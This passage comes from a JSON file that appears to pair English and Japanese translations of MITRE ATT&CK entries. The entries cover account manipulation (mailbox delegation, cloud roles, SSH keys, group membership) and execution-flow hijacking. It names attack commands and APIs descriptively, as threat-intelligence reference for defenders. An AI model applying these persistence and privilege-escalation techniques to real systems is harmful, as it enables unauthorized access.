ターゲットアカウントが要求元アカウントと異なる権限を持っている場合、攻撃者は環境内で権限を昇格させることもできる可能性があります（つまり、[クラウドアカウント](https://attack.mitre.org/techniques/T1078/004)）。(引用: Rhino Security Labs AWS Privilege Escalation)(引用: Sysdig ScarletEel 2.0) 例えば、Entra ID環境では、アプリケーション管理者ロールを持つ攻撃者は、自分のアプリケーションのサービスプリンシパルに新しい資格情報のセットを追加できます。そうすることで、攻撃者はサービスプリンシパルのロールと権限にアクセスできるようになり、これらはアプリケーション管理者のものとは異なる可能性があります。(引用: SpecterOps Azure Privilege Escalation)\n\nAWS環境では、適切な権限を持つ攻撃者は、`sts:GetFederationToken` API呼び出しを使用して、元のユーザーアカウントの権限に関連付けられた[Web認証情報の偽造](https://attack.mitre.org/techniques/T1606)のための一時的な資格情報セットを作成することもできます。これらの一時的な資格情報は、元のアカウントのAPI資格情報が無効化された場合でも、その有効期間中は有効なままです。\n(引用: Crowdstrike AWS User Federation Persistence)\n\nアプリパスワード機能が有効になっているEntra ID環境では、攻撃者はユーザーアカウントにアプリパスワードを追加できる可能性があります。(引用: Mandiant APT42 Operations 2024) アプリパスワードは多要素認証（MFA）をサポートしていないレガシーデバイスで使用することを目的としているため、アプリパスワードを追加すると、攻撃者はMFA要件をバイパスできるようになります。さらに、アプリパスワードは、ユーザーのプライマリパスワードがリセットされた場合でも有効なままです。(引用: Microsoft Entra ID App Passwords)"
                    },
                    {
                        "id": "T1098.002",
                        "name_eng": "Additional Email Delegate Permissions",
                        "name_jp": "追加のメール委任権限",
                        "description_eng": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",
                        "description_jp": "攻撃者は、攻撃者が制御する電子メールアカウントへの永続的なアクセスを維持するために、追加の許可レベルを付与する可能性があります。\n\n例えば、オンプレミスのExchangeおよびクラウドベースのサービスOffice 365で利用可能な<code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットは、メールボックスに権限を追加します。(引用: Microsoft - Add-MailboxPermission)(引用: FireEye APT35 2018)(引用: Crowdstrike Hiding in Plain Sight 2018) Google Workspaceでは、Google管理コンソール経由で委任を有効にでき、ユーザーはGmail設定経由でアカウントを委任できます。(引用: Gmail Delegation)(引用: Google Ensuring Your Information is Safe)\n\n攻撃者はまた、個々のフォルダ権限または役割を通じてメールボックスフォルダの権限を割り当てる可能性があります。Office 365環境では、攻撃者は情報ストアのトップ（ルート）、受信トレイ、またはその他のメールボックスフォルダにデフォルトまたは匿名ユーザーの権限または役割を割り当てる可能性があります。フォルダに1つまたは両方のユーザー権限を割り当てることにより、攻撃者はテナント内の他のアカウントを利用して、ターゲットユーザーのメールフォルダへの永続性を維持できます。(引用: Mandiant Defend UNC2452 White Paper)\n\nこれは、攻撃者が侵害したいアカウントに[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を追加できる永続的な脅威インシデントやBEC（ビジネスメール詐欺）インシデントで使用される可能性があります。これにより、システムへのアクセスを取得するための追加のテクニックの使用がさらに可能になる場合があります。例えば、侵害されたビジネスアカウントは、受信トレイのルールを作成しながら（例：[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)）、ターゲットビジネスのネットワーク内の他のアカウントにメッセージを送信するためによく使用され、メッセージがスパム/フィッシング検出メカニズムを回避できるようにします。(引用: Bienstock, D. - Defending O365 - 2019)"
                    },
                    {
                        "id": "T1098.003",
                        "name_eng": "Additional Cloud Roles",
                        "name_jp": "追加のクラウドロール",
                        "description_eng": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                        "description_jp": "攻撃者は、テナントへの永続的なアクセスを維持するために、攻撃者が制御するクラウドアカウントに追加のロールや権限を追加する可能性があります。例えば、攻撃者はクラウドベースの環境でIAMポリシーを更新したり、Office 365環境で新しいグローバル管理者を追加したりする可能性があります。(引用: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) 十分な権限があれば、侵害されたアカウントはデータや設定にほぼ無制限にアクセスできるようになります(他の管理者のパスワードをリセットする機能を含む)。(引用: Expel AWS Attacker)\n(引用：Microsoft O365管理者の役割)\n\nこのアカウント変更は、[アカウントの作成](https://attack.mitre.org/techniques/T1136)または他の悪意のあるアカウント活動の直後に行われる可能性があります。攻撃者は、侵害した既存の[有効なアカウント](https://attack.mitre.org/techniques/T1078)を変更することもあります。これは、特に追加されたロールが追加のアカウントへの横方向の移動を許可している場合、特権の昇格につながる可能性があります。\n\n例えば、AWS 環境では、適切な権限を持つ敵は、<code>CreatePolicyVersion</code> API を使用して IAM ポリシーの新しいバージョンを定義したり、<code>AttachUserPolicy</code> API を使用して、侵害されたユーザーアカウントに追加または別の権限を持つ IAM ポリシーをアタッチすることができます。(引用: Rhino Security Labs AWS Privilege Escalation)\n\n場合によっては、敵対者は被害者のクラウドテナントの外部で敵対者が管理するアカウントにロールを追加することがあります。これにより、これらの外部アカウントは、敵対者が[アカウントの作成](https://attack.mitre.org/techniques/T1136)または被害者が所有するアカウントを変更することなく、被害者テナント内でアクションを実行できるようになります(引用: Invictus IR DangerDev 2024)。"
                    },
                    {
                        "id": "T1098.005",
                        "name_eng": "Device Registration",
                        "name_jp": "デバイス登録",
                        "description_eng": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
                        "description_jp": "攻撃者は、攻撃者が制御するアカウントにデバイスを登録する可能性があります。デバイスは、ネットワークへの認証を処理する多要素認証（MFA）システム、またはデバイスアクセスとコンプライアンスを処理するデバイス管理システムに登録される場合があります。\n\nMFAシステム（DuoやOktaなど）では、ユーザーはMFA要件を完了するために自分のアカウントにデバイスを関連付けることができます。ユーザーの資格情報を侵害した攻撃者は、最初のMFA要件をバイパスしてネットワークへの永続的なアクセスを取得するために新しいデバイスを登録する可能性があります。(引用: CISA MFA PrintNightmare)(引用: DarkReading FireEye SolarWinds) 場合によっては、MFA自己登録プロセスでは、アカウントの最初のデバイスを登録するため、または非アクティブなアカウントにデバイスを登録するために、ユーザー名とパスワードのみが必要になることがあります。(引用: Mandiant APT29 Microsoft 365 2022)\n\n同様に、ネットワークへの既存のアクセス権を持つ攻撃者は、条件付きアクセスポリシーをバイパスしながら機密データやリソースにアクセスするために、Entra IDおよび/またはそのデバイス管理システムであるMicrosoft Intuneにデバイスを登録する可能性があります。(引用: AADInternals - Device Registration)(引用: AADInternals - Conditional Access Bypass)(引用: Microsoft DEV-0537)\n\nEntra IDに登録されたデバイスは、組織内メールを介して[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)キャンペーンを実行できる可能性があり、これはメールクライアントによって疑わしいものとして扱われる可能性が低くなります。(引用: Microsoft - Device Registration) さらに、攻撃者は多数のデバイスを登録することにより、Entra IDテナントに対して[サービス枯渇攻撃](https://attack.mitre.org/techniques/T1499/002)を実行できる可能性があります。(引用: AADInternals - BPRT)"
                    },
                    {
                        "id": "T1098.006",
                        "name_eng": "Additional Container Cluster Roles",
                        "name_jp": "追加のコンテナクラスターロール",
                        "description_eng": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                        "description_jp": "攻撃者は、コンテナオーケストレーションシステムへの永続的なアクセスを維持するために、攻撃者が制御するユーザーまたはサービスアカウントに追加のロールまたはパーミッションを追加することができます。たとえば、十分なパーミッションを持つ攻撃者は、RoleBindingまたはClusterRoleBindingを作成して、KubernetesアカウントにRoleまたはClusterRoleをバインドすることができます。(引用: Kubernetes RBAC)(引用: Aquasec Kubernetes Attack 2023) 属性ベースのアクセス制御(ABAC)が使用されている場合、十分なパーミッションを持つ攻撃者は、Kubernetes ABACポリシーを変更して、ターゲットアカウントに追加のパーミッションを与えることができます。(引用: Kuberentes ABAC)\n \nこのアカウント修正は、[アカウントの作成](https://attack.mitre.org/techniques/T1136)またはその他の悪意のあるアカウント活動の直後に行われる可能性があります。攻撃者は、侵害した既存の[有効なアカウント](https://attack.mitre.org/techniques/T1078)を修正することもあります。\n\nGoogle Kubernetes Engine、Amazon Elastic Kubernetes Service、Azure Kubernetes Serviceのように、コンテナオーケストレーションシステムがクラウド環境にデプロイされている場合、クラウドベースのロールベースアクセス制御（RBAC）割り当てまたはABACポリシーが、ローカルの権限割り当ての代わりに、またはそれに加えて、しばしば使用できることに注意してください。(引用: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) これらの場合、このテクニックは[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)と組み合わせて使用することができます。"
                    },
                    {
                        "id": "T1098.004",
                        "name_eng": "SSH Authorized Keys",
                        "name_jp": "SSH認証キー",
                        "description_eng": "Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.\n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",
                        "description_jp": "攻撃者は SSH <code>authorized_keys</code> ファイルを変更し、被害者ホスト上で永続性を維持する可能性があります。Linuxディストリビューション、macOS、およびESXiハイパーバイザーは、リモート管理のためのSSHセッションの認証プロセスを保護するために、一般的に鍵ベースの認証を使用します。SSHの<code>authorized_keys</code>ファイルは、そのファイルが設定されているユーザーアカウントへのログインに使用できるSSHキーを指定します。このファイルは通常、<code>&lt;user-home&gt;/.ssh/authorized_keys</code>（または、ESXi では `/etc/ssh/keys-&lt;username&gt;/authorized_keys`）の下のユーザーのホームディレクトリにあります。(引用: SSH Authorized Keys) ユーザーはシステムの SSH 設定ファイルを編集して、ディレクティブ `PubkeyAuthentication` と `RSAAuthentication` を値 `yes` に変更し、公開鍵と RSA 認証が有効になっていることを確認します。また、ディレクティブ `PermitRootLogin` を値 `yes` に変更し、SSH による root 認証を有効にします。(Citation: Broadcom ESXi SSH) SSH 設定ファイルは通常 <code>/etc/ssh/sshd_config</code> の下にあります。\n\n敵はスクリプトやシェル・コマンドを使ってSSHの<code>authorized_keys</code>ファイルを直接修正し、敵が提供する公開鍵を追加することができる。クラウド環境では、敵はコマンドラインインターフェースやレストAPIを使って、特定の仮想マシンのSSH authorized_keysファイルを変更できるかもしれません。例えば、Google Cloud CLIの \"add-metadata \"コマンドを使用することで、敵対者はユーザーアカウントにSSH鍵を追加することができる（引用：Google Cloud Add Metadata）（引用：Google Cloud Privilege Escalation）同様に、Azureでは、敵対者はAPIへのPATCHリクエストによって仮想マシンのauthorized_keysファイルを更新することができる。(引用：Azure Update Virtual Machines) これにより、対応する秘密鍵を所有する敵対者は、SSH経由で既存のユーザーとしてログインすることができます。(引用：Venafi SSH Key Abuse) (引用：Cybereason Linux Exim Worm) また、仮想マシンまたはインスタンスが要求ユーザーとは異なる権限を持っている場合、権限の昇格につながる可能性があります。\n\nauthorized_keysファイルがクラウドAPIやコマンドラインインターフェースを介して変更される場合、敵対者は、より高い特権ユーザーにキーを追加すると、ターゲットの仮想マシン上で特権昇格を達成する可能性があります。\n\nSSH 鍵は、`ip ssh pubkey-chain` [ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドなどで、ネットワークデバイス上のアカウントに追加することもできる。(引用: cisco_ip_ssh_pubkey_ch_cmd)"
                    },
                    {
                        "id": "T1098.007",
                        "name_eng": "Additional Local or Domain Groups",
                        "name_jp": "追加のローカルまたはドメイングループ",
                        "description_eng": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\n\nOn Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)\n\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. \n\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)",
                        "description_jp": "敵対者は、システムやドメインへの永続的なアクセスを維持するために、敵対者が管理するアカウントにローカルグループやドメイングループを追加するかもしれない。\n\nWindowsでは、アカウントは`net localgroup`コマンドと`net group`コマンドを使って、既存のユーザーをローカルグループやドメイングループに追加することができる(引用: Microsoft Net Localgroup)(引用: Microsoft Net Group) Linuxでは、敵対者は同じ目的で`usermod`コマンドを使うことができる(引用: Linux Usermod)\n\n例えば、Windowsデバイスのローカル管理者グループにアカウントを追加して、昇格した特権を維持することができる。また、将来エンドポイントにログインするために[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)を利用できるように、Remote Desktop Usersグループに追加することもできる。(引用: Microsoft RDP Logons) Linuxでは、昇格した特権のために[SudoおよびSudoキャッシング](https://attack.mitre.org/techniques/T1548/003)を持続的に利用できるように、sudoersグループにアカウントを追加することができる。\n\nWindows環境では、マシンアカウントをドメイングループに追加することもできる。これにより、ローカルのSYSTEMアカウントがドメイン上で特権を得ることができる(引用：RootDSE AD Detection 2022)。"
                    }
                ]
            },
            {
                "id": "T1574",
                "name_eng": "Hijack Execution Flow",
                "name_jp": "実行フローのハイジャック",
                "description_eng": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
                "description_jp": "攻撃者は、オペレーティングシステムがプログラムを実行する方法をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。実行フローのハイジャックは、ハイジャックされた実行が時間とともに再発する可能性があるため、永続化を目的とすることができます。攻撃者はまた、アプリケーション制御やその他の実行制限など、権限を昇格させたり防御を回避したりするためにこれらのメカニズムを使用する可能性があります。\n\n攻撃者が実行フローをハイジャックする方法は多数あり、オペレーティングシステムが実行するプログラムを特定する方法を操作することなどが含まれます。プログラムが使用するライブラリをオペレーティングシステムが特定する方法も傍受される可能性があります。ファイルディレクトリや、Windowsの場合はレジストリなど、オペレーティングシステムがプログラム/リソースを探す場所も、悪意のあるペイロードを含むように汚染される可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1574.010",
                        "name_eng": "Services File Permissions Weakness",
                        "name_jp": "サービスファイルパーミッションの脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                        "description_jp": "攻撃者は、サービスによって使用されるバイナリをハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。攻撃者は、Windowsサービスのアクセス許可の欠陥を使用して、サービス開始時に実行されるバイナリを置き換える可能性があります。これらのサービスプロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。ターゲットバイナリを含むファイルシステムディレクトリのアクセス許可、またはバイナリ自体のアクセス許可が不適切に設定されている場合、ターゲットバイナリはユーザーレベルのアクセス許可を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高いアクセス許可レベルで実行されている場合、置き換えられたバイナリもSYSTEMを含むより高いレベルのアクセス許可で実行されます。\n\n攻撃者は、より高いアクセス許可レベルでコードを実行する手段として、正当なバイナリを悪意のあるバイナリに置き換えるためにこのテクニックを使用する可能性があります。実行中のプロセスが特定の時間に実行されるように設定されている場合、または特定のイベント（システムの起動など）中に実行されるように設定されている場合、このテクニックは永続化にも使用できます。"
                    },
                    {
                        "id": "T1574.013",
                        "name_eng": "KernelCallbackTable",
                        "name_jp": "KernelCallbackTable",
                        "description_eng": "Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスの<code>KernelCallbackTable</code>を悪用してその実行フローをハイジャックし、独自のペイロードを実行する可能性があります。(引用: Lazarus APT January 2022)(引用: FinFisher exposed ) <code>KernelCallbackTable</code>はプロセス環境ブロック（PEB）にあり、<code>user32.dll</code>がロードされるとGUIプロセスで利用可能なグラフィック関数の配列に初期化されます。(引用: Windows Process Injection KernelCallbackTable)\n\n攻撃者は、元のコールバック関数を悪意のあるペイロードに置き換えることにより、<code>KernelCallbackTable</code>を使用してプロセスの実行フローをハイジャックする可能性があります。コールバック関数の変更は、別のプロセスへの[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620)や[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)など、関連する動作を含むさまざまな方法で実現できます。\n\n<code>KernelCallbackTable</code>のメモリアドレスへのポインタは、PEBを特定することによって取得できます（例：<code>NtQueryInformationProcess()</code> [ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数の呼び出しを介して）。(引用: NtQueryInformationProcess) ポインタが見つかると、<code>KernelCallbackTable</code>を複製し、テーブル内の関数（例：<code>fnCOPYDATA</code>）を悪意のあるペイロードのアドレスに設定できます（例：<code>WriteProcessMemory()</code>を介して）。その後、PEBはテーブルの新しいアドレスで更新されます。改ざんされた関数が呼び出されると、悪意のあるペイロードがトリガーされます。(引用: Lazarus APT January 2022)\n\n改ざんされた関数は通常、Windowsメッセージを使用して呼び出されます。プロセスがハイジャックされ、悪意のあるコードが実行された後、<code>KernelCallbackTable</code>は悪意のあるペイロードの残りの部分によって元の状態に復元される場合もあります。(引用: Lazarus APT January 2022) 実行が正当なプロセスの下でマスクされるため、<code>KernelCallbackTable</code>を使用して実行フローをハイジャックすると、セキュリティ製品による検出を回避できる場合があります。"
                    },
                    {
                        "id": "T1574.007",
                        "name_eng": "Path Interception by PATH Environment Variable",
                        "name_jp": "PATH環境変数によるパスインターセプション",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                        "description_jp": "攻撃者は、ライブラリのロードに使用される環境変数をハイジャックすることで、独自の悪意のあるペイロードを実行する可能性があります。PATH環境変数には、スクリプトまたはコマンドラインから呼び出されたバイナリを検索するためにOSが順次検索するディレクトリ（ユーザーおよびシステム）のリストが含まれています。\n\n攻撃者は、PATH環境変数に格納されているディレクトリのリストの前のエントリに悪意のあるプログラムを配置することで、OSがそのPATHリストを順次検索するときに、正当なバイナリではなく悪意のあるバイナリを実行するように仕向けることができます。\n\n例えば、Windowsで攻撃者が「net.exe」という名前の悪意のあるプログラムを`C:\\example path`に配置し、これがデフォルトでPATH環境変数の`C:\\Windows\\system32\\net.exe`より前にある場合、コマンドラインから「net」が実行されると、システムの正当な実行可能ファイルである`C:\\Windows\\system32\\net.exe`の代わりに`C:\\example path`が呼び出されます。プログラムを実行する一部のメソッドは、プログラムのパスが指定されていない場合に検索される場所を決定するためにPATH環境変数に依存します。例えば、[コマンドおよびスクリプトインタープリター](https://attack.mitre.org/techniques/T1059)からプログラムを実行する場合などです。(引用: ExpressVPN PATH env Windows 2021)\n\n攻撃者はまた、検索対象のディレクトリを指定する$PATH変数を直接変更することもあります。攻撃者は、書き込みアクセス権を持つディレクトリを指すように`$PATH`変数を変更できます。$PATH変数を使用するプログラムが呼び出されると、OSは指定されたディレクトリを検索し、悪意のあるバイナリを実行します。macOSでは、これは$HOME変数を変更することによっても実行できます。これらの変数は、コマンドライン、launchctl、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または`/etc/paths.d`フォルダの内容を変更することによって変更できます。(引用: uptycs Fake POC linux malware 2023)(引用: nixCraft macOS PATH variables)(引用: Elastic Rules macOS launchctl 2022)"
                    },
                    {
                        "id": "T1574.005",
                        "name_eng": "Executable Installer File Permissions Weakness",
                        "name_jp": "実行可能インストーラーファイルのアクセス許可の脆弱性",
                        "description_eng": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, 